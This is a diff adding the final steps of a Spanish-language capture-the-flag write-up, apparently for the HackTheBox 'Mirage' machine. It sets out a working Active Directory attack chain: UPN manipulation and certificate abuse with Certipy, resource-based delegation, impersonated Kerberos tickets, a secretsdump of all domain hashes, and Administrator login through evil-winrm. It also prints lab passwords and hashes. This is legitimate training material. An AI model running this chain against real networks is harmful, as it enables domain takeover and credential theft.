@@ -728,13 +728,130 @@ impacket-getTGT mirage.htb/'Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f
 
 <img width="1920" height="169" alt="image" src="https://github.com/user-attachments/assets/504ff88c-5b0e-41d8-8e59-fe26d735bbac" />
 
+```bash
+export KRB5CCNAME=Mirage-Service\$.ccache
+```
 
+ahora usaremos de Certipy para modificar el UPN del usuario `mark.bbond`
 
+```bash
+certipy-ad account update -user 'mark.bbond' -upn 'dc01$@mirage.htb' -u 'mirage-service$@mirage.htb' -k -no-pass -dc-ip 10.10.11.78 -target dc01.mirage.htb
+```
 
+<img width="1920" height="169" alt="image" src="https://github.com/user-attachments/assets/cc8735e0-279e-4363-bc90-9ec895b5f624" />
 
+solicitamos un nuevo ticket kerberos y lo cargamos en cache
 
+```bash
+impacket-getTGT mirage.htb/mark.bbond:'1day@atime'
+```
 
+```bash
+export KRB5CCNAME=mark.bbond.ccache
+```
 
+ahora solicitamos un certificado
 
+```bash
+certipy-ad req -u 'mark.bbond@mirage.htb' -k -no-pass -dc-ip 10.10.11.78 -target 'dc01.mirage.htb' -ca 'mirage-DC01-CA' -template 'User'
+```
+```bash
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[*] Requesting certificate via RPC
+[*] Request ID is 28
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'dc01$@mirage.htb'
+[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
+[*] Saving certificate and private key to 'dc01.pfx'
+[*] Wrote certificate and private key to 'dc01.pfx'
+```
+
+ya solicitado el certificado devolvemos el valor aoriginal al `UPN` del usuario `mark.bbond` asi que primero cargamos en cache el ticket kerberos del usuario `Mirage-Service$`
+
+```bash
+export KRB5CCNAME=Mirage-Service\$.ccache
+```
+restauramos el valor original del `UPN`
+
+```bash
+certipy-ad account update -user 'mark.bbond' -upn 'mark.bbond@mirage.htb' -u 'mirage-service$@mirage.htb' -k -no-pass -dc-ip 10.10.11.78 -target dc01.mirage.htb
+```
+```bash
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'mark.bbond':
+    userPrincipalName                   : mark.bbond@mirage.htb
+[*] Successfully updated 'mark.bbond'
+
+```
+>>> Restaurar este valor luego de haber solicitado el certificado es necesario para evitar discrepancias mas tarde en la autenticacion kerberos
+
+### Shell LDAP con Certipy
+
+```bash
+certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
+```
+
+<img width="1920" height="223" alt="image" src="https://github.com/user-attachments/assets/e884086e-d11e-491f-939c-c50dc1217a27" />
+
+## Delegación restringida basada en recursos (RBCD)
+
+En la shell `ldap` ejecutamos el comando:
+
+```bash
+set_rbcd dc01$ Mirage-Service$
+```
+
+>>> Esto configura delegación basada en recursos desde Mirage-Service$ hacia dc01$, permitiendo a Mirage-Service$ hacerse pasar por otros usuarios al conectarse a dc01
+
+<img width="1920" height="436" alt="image" src="https://github.com/user-attachments/assets/e048b86a-c2cd-404f-aea5-3d5b73ee8693" />
+
+### ticket Kerberos (TGS)
+
+ahora vamos a solicitar un ticket para  el servicio `CIFS` en `DC01.mirage.htb`,  como si fueramos `DC01$` {Suplantacion de Identidad}
+
+```bash
+export KRB5CCNAME=Mirage-Service\$.ccache
+```
+
+```bash
+impacket-getST -spn 'cifs/DC01.mirage.htb' -impersonate 'dc01$' -dc-ip 10.10.11.78  'mirage.htb/Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866
+```
+
+```bash
+export KRB5CCNAME=dc01\$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
+```
+
+<img width="1920" height="305" alt="image" src="https://github.com/user-attachments/assets/29e08bd7-457c-4fb2-9ada-65b0266d277e" />
+
+## Extraccion de Hashes !Pwned!
+
+ahora vamos a extraer todos los hashes del sistema para luego poder acceder como cualquier usuario
+
+```bash
+impacket-secretsdump -k -no-pass -dc-ip 10.10.11.78 dc01.mirage.htb
+```
+<img width="1920" height="959" alt="image" src="https://github.com/user-attachments/assets/08bfdd21-b9ac-40f9-b596-abd63bd5ce26" />
+
+acceso al sistema!
+
+Solicitamos un ticket kerberos para el administrador
+
+```bash
+impacket-getTGT mirage.htb/Administrator -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3
+```
+
+cargamos el ticket en cache y accedemos via `WinRm`
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+```bash
+evil-winrm -i DC01.mirage.htb -k -u 'Administrator' -r MIRAGE.HTB
+```
+
+<img width="1920" height="934" alt="image" src="https://github.com/user-attachments/assets/56072e6b-5659-4b16-8aa8-bd4e2af9b854" />
 
 
